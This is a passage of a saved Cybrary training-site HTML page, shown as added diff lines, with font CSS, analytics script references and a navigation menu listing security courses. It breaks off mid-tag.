format("opentype");font-weight:400;font-style:normal;}@font-face{font-family:tk-skippy-sharp-n4;src:url(https://use.typekit.net/af/4d7d98/00000000000000003b9acfe1/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff2"),url(https://use.typekit.net/af/4d7d98/00000000000000003b9acfe1/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff"),url(https://use.typekit.net/af/4d7d98/00000000000000003b9acfe1/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("opentype");font-weight:400;font-style:normal;}</style><script>try{Typekit.load({ async: true });}catch(e){}</script><script>
+    var userId = 0;
+</script>
+<style>
+    /* Clean up display of registration page with CSS */
+    body.registration.register.page-template #wrapper-1 #page-content-title,
+    body.registration.register.page-template #wrapper-1 #page-content,
+    body.registration.register.page-template #wrapper-1 #page-content-sidebar {
+        opacity: 0;
+    }
+</style>
+<style type="text/css">@font-face{font-family:proxima-nova;src:url(https://use.typekit.net/af/1309c2/00000000000000000001782d/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n9&v=3) format("woff2"),url(https://use.typekit.net/af/1309c2/00000000000000000001782d/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n9&v=3) format("woff"),url(https://use.typekit.net/af/1309c2/00000000000000000001782d/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n9&v=3) format("opentype");font-weight:900;font-style:normal;}@font-face{font-family:proxima-nova;src:url(https://use.typekit.net/af/bcf44c/00000000000000000001782b/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n8&v=3) format("woff2"),url(https://use.typekit.net/af/bcf44c/00000000000000000001782b/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n8&v=3) format("woff"),url(https://use.typekit.net/af/bcf44c/00000000000000000001782b/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n8&v=3) format("opentype");font-weight:800;font-style:normal;}@font-face{font-family:proxima-nova;src:url(https://use.typekit.net/af/bf5c6c/000000000000000000017827/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n6&v=3) format("woff2"),url(https://use.typekit.net/af/bf5c6c/000000000000000000017827/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n6&v=3) format("woff"),url(https://use.typekit.net/af/bf5c6c/000000000000000000017827/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n6&v=3) format("opentype");font-weight:600;font-style:normal;}@font-face{font-family:proxima-nova;src:url(https://use.typekit.net/af/3ae8bb/000000000000000000017823/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff2"),url(https://use.typekit.net/af/3ae8bb/000000000000000000017823/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff"),url(https://use.typekit.net/af/3ae8bb/000000000000000000017823/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("opentype");font-weight:400;font-style:normal;}@font-face{font-family:skippy-sharp;src:url(https://use.typekit.net/af/4d7d98/00000000000000003b9acfe1/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff2"),url(https://use.typekit.net/af/4d7d98/00000000000000003b9acfe1/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff"),url(https://use.typekit.net/af/4d7d98/00000000000000003b9acfe1/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("opentype");font-weight:400;font-style:normal;}</style><script type="text/javascript" async="" src="Hacking%20Database%20-%20Cybrary_files/munchkin.js"></script></head>
+<body class="bp-legacy msc-template-default single single-msc postid-111478 admin-bar no-customize-support u-design-responsive-on  u-design-menu-drop-shadows-on top-bg-color-dark js" data-gr-c-s-loaded="true">
+
+    <div id="wrapper-1">
+            <div id="top-wrapper">
+                <div id="top-elements" class="container_24">
+                    <div id="logo" class="grid_3">
+                            <div class="site-name"><a title="Cybrary" href="https://www.cybrary.it/">Cybrary</a></div>
+                    </div>
+            <div id="main-menu-v2" class="grid_13 pngfix">
+                <div id="dropdown-holder">
+
+<!-- UberMenu [Configuration:main] [Theme Loc:primary] [Integration:auto] -->
+<a class="ubermenu-responsive-toggle ubermenu-responsive-toggle-main ubermenu-skin-grey-white ubermenu-loc-primary" data-ubermenu-target="ubermenu-main-2-primary"><i class="fa fa-bars"></i>Menu</a><nav id="ubermenu-main-2-primary" class="ubermenu ubermenu-main ubermenu-menu-2 ubermenu-loc-primary ubermenu-responsive ubermenu-responsive-default ubermenu-responsive-collapse ubermenu-horizontal ubermenu-transition-fade ubermenu-trigger-hover_intent ubermenu-skin-grey-white  ubermenu-bar-align-left ubermenu-items-align-left ubermenu-disable-submenu-scroll ubermenu-sub-indicators ubermenu-retractors-responsive ubermenu-touch"><ul id="ubermenu-nav-main-2-primary" class="ubermenu-nav"><li id="menu-item-56811" class="ubermenu-item ubermenu-item-type-post_type ubermenu-item-object-page ubermenu-item-has-children ubermenu-item-56811 ubermenu-item-level-0 ubermenu-column ubermenu-column-auto ubermenu-has-submenu-drop ubermenu-has-submenu-flyout"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/catalog" tabindex="0"><span class="ubermenu-target-title ubermenu-target-text">CATALOG</span></a><ul class="ubermenu-submenu ubermenu-submenu-id-56811 ubermenu-submenu-type-flyout ubermenu-submenu-drop ubermenu-submenu-align-left_edge_item"><li id="menu-item-43415" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-has-children ubermenu-item-43415 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-1 ubermenu-has-submenu-drop ubermenu-has-submenu-flyout"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/catalog/"><span class="ubermenu-target-title ubermenu-target-text">Video Courses by Level</span></a><ul class="ubermenu-submenu ubermenu-submenu-id-43415 ubermenu-submenu-type-auto ubermenu-submenu-type-flyout ubermenu-submenu-drop ubermenu-submenu-align-left_edge_item"><li id="menu-item-43416" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-has-children ubermenu-item-43416 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-2 ubermenu-has-submenu-drop ubermenu-has-submenu-flyout"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/catalog?level=beginner"><span class="ubermenu-target-title ubermenu-target-text">Beginner</span></a><ul class="ubermenu-submenu ubermenu-submenu-id-43416 ubermenu-submenu-type-auto ubermenu-submenu-type-flyout ubermenu-submenu-drop ubermenu-submenu-align-left_edge_item"><li id="menu-item-43387" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-43387 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-3 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/course/comptia-901-2018/"><span class="ubermenu-target-title ubermenu-target-text">CompTIA A+</span></a></li><li id="menu-item-254308" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-254308 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-3 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/course/comptia-network-plus/"><span class="ubermenu-target-title ubermenu-target-text">CompTIA Network+</span></a></li><li id="menu-item-43392" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-43392 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-3 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/course/comptia-security/"><span class="ubermenu-target-title ubermenu-target-text">CompTIA Security+</span></a></li><li id="menu-item-43394" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-43394 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-3 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/course/cryptography/"><span class="ubermenu-target-title ubermenu-target-text">Cryptography</span></a></li><li id="menu-item-254309" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-254309 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-3 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/course/cisco-ccna/"><span class="ubermenu-target-title ubermenu-target-text">Cisco CCNA</span></a></li><li id="menu-item-88265" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-88265 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-3 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/course/intro-cyber-threat-intelligence/"><span class="ubermenu-target-title ubermenu-target-text">Cyber Threat Intel</span></a></li><li id="menu-item-95462" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-95462 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-3 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/catalog?level=beginner"><span class="ubermenu-target-title ubermenu-target-text">… see more</span></a></li><li class="ubermenu-retractor ubermenu-retractor-mobile"><i class="fa fa-times"></i> Close</li></ul></li><li id="menu-item-43417" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-has-children ubermenu-item-43417 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-2 ubermenu-has-submenu-drop ubermenu-has-submenu-flyout"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/catalog?level=intermediate"><span class="ubermenu-target-title ubermenu-target-text">Intermediate</span></a><ul class="ubermenu-submenu ubermenu-submenu-id-43417 ubermenu-submenu-type-auto ubermenu-submenu-type-flyout ubermenu-submenu-drop ubermenu-submenu-align-left_edge_item"><li id="menu-item-43400" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-43400 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-3"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/course/ethical-hacking/"><span class="ubermenu-target-title ubermenu-target-text">Penetration Testing and Ethical Hacking</span></a></li><li id="menu-item-244224" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-244224 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-3"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/course/comptia-cysa-2018/"><span class="ubermenu-target-title ubermenu-target-text">CompTIA CySA+</span></a></li><li id="menu-item-43395" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-43395 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-3"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/course/cisa/"><span class="ubermenu-target-title ubermenu-target-text">CISA</span></a></li><li id="menu-item-43397" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-43397 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-3"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/course/computer-hacking-forensics-analyst/"><span class="ubermenu-target-title ubermenu-target-text">Computer and Hacking Forensics</span></a></li><li id="menu-item-254310" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-254310 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-3"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/course/nist-800-171-controlled-unclassified-information-course/"><span class="ubermenu-target-title ubermenu-target-text">NIST 800-171 Controlled Unclassified Information Course</span></a></li><li id="menu-item-43402" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-43402 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-3"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/course/virtualization-management/"><span class="ubermenu-target-title ubermenu-target-text">Virtualization Management</span></a></li><li id="menu-item-95463" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-95463 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-3"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/catalog?level=intermediate"><span class="ubermenu-target-title ubermenu-target-text">… see more</span></a></li><li class="ubermenu-retractor ubermenu-retractor-mobile"><i class="fa fa-times"></i> Close</li></ul></li><li id="menu-item-43418" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-has-children ubermenu-item-43418 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-2 ubermenu-has-submenu-drop ubermenu-has-submenu-flyout"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/catalog?level=advanced"><span class="ubermenu-target-title ubermenu-target-text">Advanced / Leadership</span></a><ul class="ubermenu-submenu ubermenu-submenu-id-43418 ubermenu-submenu-type-auto ubermenu-submenu-type-flyout ubermenu-submenu-drop ubermenu-submenu-align-left_edge_item"><li id="menu-item-254311" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-254311 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-3"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/course/chief-information-security-officer-ciso/"><span class="ubermenu-target-title ubermenu-target-text">Chief Information Security Officer (CISO)</span></a></li><li id="menu-item-43405" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-43405 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-3"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/course/cissp/"><span class="ubermenu-target-title ubermenu-target-text">CISSP</span></a></li><li id="menu-item-43403" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-43403 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-3"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/course/advanced-penetration-testing/"><span class="ubermenu-target-title ubermenu-target-text">Advanced Penetration Testing</span></a></li><li id="menu-item-254312" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-254312 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-3"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/course/incident-response-and-handling/"><span class="ubermenu-target-title ubermenu-target-text">Incident Response and Advanced Forensics</span></a></li><li id="menu-item-43409" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-43409 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-3"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/course/python/"><span class="ubermenu-target-title ubermenu-target-text">Python for Security Professionals</span></a></li><li id="menu-item-43410" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-43410 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-3"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/course/social-engineering/"><span class="ubermenu-target-title ubermenu-target-text">Social Engineering and Manipulation</span></a></li><li id="menu-item-95464" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-95464 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-3"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/catalog?level=advanced"><span class="ubermenu-target-title ubermenu-target-text">… see more</span></a></li><li class="ubermenu-retractor ubermenu-retractor-mobile"><i class="fa fa-times"></i> Close</li></ul></li><li class="ubermenu-retractor ubermenu-retractor-mobile"><i class="fa fa-times"></i> Close</li></ul></li><li id="menu-item-78622" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-has-children ubermenu-item-78622 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-1 ubermenu-has-submenu-drop ubermenu-has-submenu-flyout"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/cybrary-insider-pro/"><span class="ubermenu-target-title ubermenu-target-text">Hands-On Experience</span></a><ul class="ubermenu-submenu ubermenu-submenu-id-78622 ubermenu-submenu-type-auto ubermenu-submenu-type-flyout ubermenu-submenu-drop ubermenu-submenu-align-left_edge_item"><li id="menu-item-232706" class="ubermenu-item ubermenu-item-type-post_type ubermenu-item-object-page ubermenu-item-232706 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-2 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/hands-on-lab-based-cyber-security-virtual-training/"><span class="ubermenu-target-title ubermenu-target-text">CYBRScore – Hands on Lab Based Cyber Security Virtual Training</span></a></li><li id="menu-item-232709" class="ubermenu-item ubermenu-item-type-post_type ubermenu-item-object-page ubermenu-item-232709 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-2 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/cydefe-cyber-security-skills-virtual-training-assessment/"><span class="ubermenu-target-title ubermenu-target-text">Cydefe – Capture the Flag Based Training and Assessment</span></a></li><li id="menu-item-245331" class="ubermenu-item ubermenu-item-type-post_type ubermenu-item-object-page ubermenu-item-245331 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-2 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/practice-labs-hands-cyber-security-labs/"><span class="ubermenu-target-title ubermenu-target-text">Practice Labs – Hands-on Certification Prep Labs</span></a></li><li id="menu-item-232720" class="ubermenu-item ubermenu-item-type-post_type ubermenu-item-object-page ubermenu-item-232720 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-2 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/kaplan-practice-test-software-certification-prep/"><span class="ubermenu-target-title ubermenu-target-text">Kaplan – Certification Practice Test Software</span></a></li><li id="menu-item-232725" class="ubermenu-item ubermenu-item-type-post_type ubermenu-item-object-page ubermenu-item-232725 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-2 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/rangeforce-secure-coding-training-developers-devops/"><span class="ubermenu-target-title ubermenu-target-text">Rangeforce – Secure Coding Exercises</span></a></li><li class="ubermenu-retractor ubermenu-retractor-mobile"><i class="fa fa-times"></i> Close</li></ul></li><li id="menu-item-232743" class="ubermenu-item ubermenu-item-type-post_type ubermenu-item-object-page ubermenu-item-232743 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-1"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/cybrary-live/"><span class="ubermenu-target-title ubermenu-target-text">Live Online</span></a></li><li id="menu-item-43719" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-has-children ubermenu-item-43719 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-1 ubermenu-has-submenu-drop ubermenu-has-submenu-flyout"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="#"><span class="ubermenu-target-title ubermenu-target-text">Additional Resources</span></a><ul class="ubermenu-submenu ubermenu-submenu-id-43719 ubermenu-submenu-type-auto ubermenu-submenu-type-flyout ubermenu-submenu-drop ubermenu-submenu-align-left_edge_item"><li id="menu-item-39925" class="ubermenu-item ubermenu-item-type-post_type ubermenu-item-object-page ubermenu-item-39925 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-2 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/free-study-guides/"><span class="ubermenu-target-title ubermenu-target-text">Free Study Guides</span></a></li><li id="menu-item-32068" class="ubermenu-item ubermenu-item-type-post_type ubermenu-item-object-page ubermenu-item-32068 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-2 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/glossary/"><span class="ubermenu-target-title ubermenu-target-text">Cyber Security Glossary</span></a></li><li class="ubermenu-retractor ubermenu-retractor-mobile"><i class="fa fa-times"></i> Close</li></ul></li><li id="menu-item-254083" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-254083 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-1"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/certification-exam-marketplace/"><span class="ubermenu-target-title ubermenu-target-text">Exam Vouchers</span></a></li><li class="ubermenu-retractor ubermenu-retractor-mobile"><i class="fa fa-times"></i> Close</li></ul></li><li id="menu-item-12155" class="ubermenu-item ubermenu-item-type-post_type ubermenu-item-object-page ubermenu-item-has-children ubermenu-item-12155 ubermenu-item-level-0 ubermenu-column ubermenu-column-auto ubermenu-has-submenu-drop ubermenu-has-submenu-flyout"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/cybrary-0p3n/" tabindex="0"><span class="ubermenu-target-title ubermenu-target-text">COMMUNITY</span></a><ul class="ubermenu-submenu ubermenu-submenu-id-12155 ubermenu-submenu-type-flyout ubermenu-submenu-drop ubermenu-submenu-align-left_edge_item"><li id="menu-item-255117" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-255117 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-1"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/instructors/"><span class="ubermenu-target-title ubermenu-target-text">Instructors</span></a></li><li id="menu-item-46918" class="ubermenu-item ubermenu-item-type-post_type ubermenu-item-object-page ubermenu-item-has-children ubermenu-item-46918 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-1 ubermenu-has-submenu-drop ubermenu-has-submenu-flyout"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/cybrary-0p3n/"><span class="ubermenu-target-title ubermenu-target-text">Open Blog</span></a><ul class="ubermenu-submenu ubermenu-submenu-id-46918 ubermenu-submenu-type-auto ubermenu-submenu-type-flyout ubermenu-submenu-drop ubermenu-submenu-align-left_edge_item"><li id="menu-item-43423" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-43423 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-2 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/cybrary-0p3n/contribute/"><span class="ubermenu-target-title ubermenu-target-text">Submit a Post</span></a></li><li class="ubermenu-retractor ubermenu-retractor-mobile"><i class="fa fa-times"></i> Close</li></ul></li><li id="menu-item-108370" class="ubermenu-item ubermenu-item-type-post_type ubermenu-item-object-page ubermenu-item-108370 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-1"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/alliances/"><span class="ubermenu-target-title ubermenu-target-text">Companies</span></a></li><li id="menu-item-112465" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-112465 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-1"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/events/"><span class="ubermenu-target-title ubermenu-target-text">Events</span></a></li><li id="menu-item-956" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-has-children ubermenu-item-956 ubermenu-item-normal ubermenu-item-level-1 ubermenu-has-submenu-drop ubermenu-has-submenu-flyout"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/forums/"><span class="ubermenu-target-title ubermenu-target-text">Forums</span></a><ul class="ubermenu-submenu ubermenu-submenu-id-956 ubermenu-submenu-type-flyout ubermenu-submenu-drop ubermenu-submenu-align-left_edge_item"><li id="menu-item-53790" class="ubermenu-item ubermenu-item-type-post_type ubermenu-item-object-forum ubermenu-item-53790 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-2"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/forums/discussing/new-to-cybrary/"><span class="ubermenu-target-title ubermenu-target-text">New to Cybrary</span></a></li><li id="menu-item-53782" class="ubermenu-item ubermenu-item-type-post_type ubermenu-item-object-forum ubermenu-item-53782 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-2"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/forums/discussing/courses/"><span class="ubermenu-target-title ubermenu-target-text">Courses</span></a></li><li id="menu-item-53785" class="ubermenu-item ubermenu-item-type-post_type ubermenu-item-object-forum ubermenu-item-53785 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-2"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/forums/discussing/help-us-improve-cybrary/"><span class="ubermenu-target-title ubermenu-target-text">Help Us Improve Cybrary</span></a></li><li id="menu-item-53780" class="ubermenu-item ubermenu-item-type-post_type ubermenu-item-object-forum ubermenu-item-53780 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-2"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/forums/discussing/break-room/"><span class="ubermenu-target-title ubermenu-target-text">The Break Room</span></a></li><li class="ubermenu-retractor ubermenu-retractor-mobile"><i class="fa fa-times"></i> Close</li></ul></li><li id="menu-item-963" class="ubermenu-item ubermenu-item-type-post_type ubermenu-item-object-page ubermenu-item-963 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-1"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/blog/"><span class="ubermenu-target-title ubermenu-target-text">Cybrary Blog</span></a></li><li id="menu-item-249594" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-has-children ubermenu-item-249594 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-1 ubermenu-has-submenu-drop ubermenu-has-submenu-flyout"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/contribute/"><span class="ubermenu-target-title ubermenu-target-text">Ways to Contribute</span></a><ul class="ubermenu-submenu ubermenu-submenu-id-249594 ubermenu-submenu-type-auto ubermenu-submenu-type-flyout ubermenu-submenu-drop ubermenu-submenu-align-left_edge_item"><li id="menu-item-217468" class="ubermenu-item ubermenu-item-type-post_type ubermenu-item-object-page ubermenu-item-217468 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-2 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/cybraryteach/"><span class="ubermenu-target-title ubermenu-target-text">Be an Instructor</span></a></li><li id="menu-item-249593" class="ubermenu-item ubermenu-item-type-post_type ubermenu-item-object-page ubermenu-item-249593 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-2 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/become-teaching-assistant-cybrary/"><span class="ubermenu-target-title ubermenu-target-text">Be a Teaching Assistant</span></a></li><li class="ubermenu-retractor ubermenu-retractor-mobile"><i class="fa fa-times"></i> Close</li></ul></li><li class="ubermenu-retractor ubermenu-retractor-mobile"><i class="fa fa-times"></i> Close</li></ul></li><li 